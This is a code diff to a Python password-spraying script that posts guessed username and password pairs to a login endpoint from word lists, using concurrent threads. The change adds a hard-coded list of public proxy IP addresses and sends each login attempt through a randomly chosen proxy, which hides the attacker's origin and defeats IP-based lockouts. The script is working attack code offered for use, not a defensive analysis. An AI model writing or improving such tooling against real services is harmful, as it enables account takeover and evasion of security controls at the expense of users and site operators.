@@ -1,6 +1,7 @@
 import os
 import requests
 from concurrent.futures import ThreadPoolExecutor
+import random
 
 # Set the correct target URL for the login endpoint on your backend
 url = "http://localhost:5050/login"
@@ -20,6 +21,20 @@ def read_usernames(file_path):
 def read_passwords(file_path):
     with open(file_path, 'r') as file:
         return [line.strip() for line in file.readlines()]
+    
+# List of proxies
+proxies_list = [
+    {"http": "http://20.111.54.16:8123", "https": "http://20.111.54.16:8123"},
+    {"http": "http://43.200.77.128:3128", "https": "http://43.200.77.128:3128"},
+    {"http": "http://47.178.24.220:80", "https": "http://47.178.24.220:80"},
+    {"http": "http://178.128.199.145:80", "https": "http://178.128.199.145:80"},
+    {"http": "http://143.42.66.91:80", "https": "http://143.42.66.91:80"},
+    # Add the rest of the proxies here
+]
+
+# Function to get a random proxy
+def get_random_proxy():
+    return random.choice(proxies_list)
 
 # Function to perform a single login attempt
 def attempt_login(username, password):
@@ -27,23 +42,20 @@ def attempt_login(username, password):
         'username': username,
         'password': password
     }
-
+    
+    # Get a random proxy for the request
+    proxy = get_random_proxy()
+    
     try:
-        response = requests.post(url, json=data, headers=headers)
-
-        # Check the HTTP status code
+        response = requests.post(url, json=data, proxies=proxy)
+        
+        # Check the response status
         if response.status_code == 200:
-            print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code})")
-        elif response.status_code == 302:  # Redirect (could indicate success in some systems)
-            print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')})")
-        elif response.status_code == 401:
-            print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized)")
-        elif response.status_code == 403:
-            print(f"[-] Failed login for {username} (Status Code: 403 Forbidden)")
+            print(f"Successful login with {username}:{password} using proxy {proxy}")
         else:
-            print(f"[-] Failed login for {username} (Status Code: {response.status_code})")
+            print(f"Failed login for {username} using proxy {proxy}")
     except Exception as e:
-        print(f"[-] Error occurred for {username}: {e}")
+        print(f"Error with proxy {proxy}: {e}")
 
 # Function to perform password spraying
 def password_spray(usernames, passwords):
